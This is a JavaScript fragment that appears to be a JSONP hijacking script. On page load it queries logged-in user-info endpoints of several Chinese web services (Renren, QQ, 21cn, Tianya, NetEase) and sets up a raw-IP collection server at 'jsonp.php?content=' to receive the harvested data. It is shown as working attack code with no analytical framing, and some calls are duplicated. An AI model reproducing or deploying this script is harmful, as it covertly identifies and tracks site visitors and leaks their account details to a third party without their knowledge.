...
http_server = "http://139.198.170.241:9090/jsonp.php?content="; 
var info = {}; 
...
window.onload = function(){ 
  ...
  try{ 
    noJsonp('http://passport.game.renren.com:80/user/info?callback=renren_game_passport');
  } 
  catch(e){}
  try{ 
    noJsonp('http://apps.game.qq.com:80/php/tgclub/m/user/getPersonalInfo?callback=qq_num');
  } 
  catch(e){}
  try{ 
    noJsonp('http://passport.21cn.com:80/api/getUser.do?require=bindInfo0x2cloginInfo&jsoncallback=cn_id');
  } 
  catch(e){}
  try{ 
    noJsonp('http://passport.game.renren.com:80/user/info?callback=renren_game_passport');
  ...
  try{ 
    noJsonp('http://passport.tianya.cn:80/online/checkuseronline.jsp?callback=tianya_passport');
  } 
  catch(e){}
  try{ 
    noJsonp('http://passport.tianya.cn:80/online/checkuseronline.jsp?callback=tianya_passport');
  ...
  try{ 
    noJsonp('http://comment.api.163.com:80/reply/check.jsp?callback=wy_id');
  } 
  catch(e){}
};
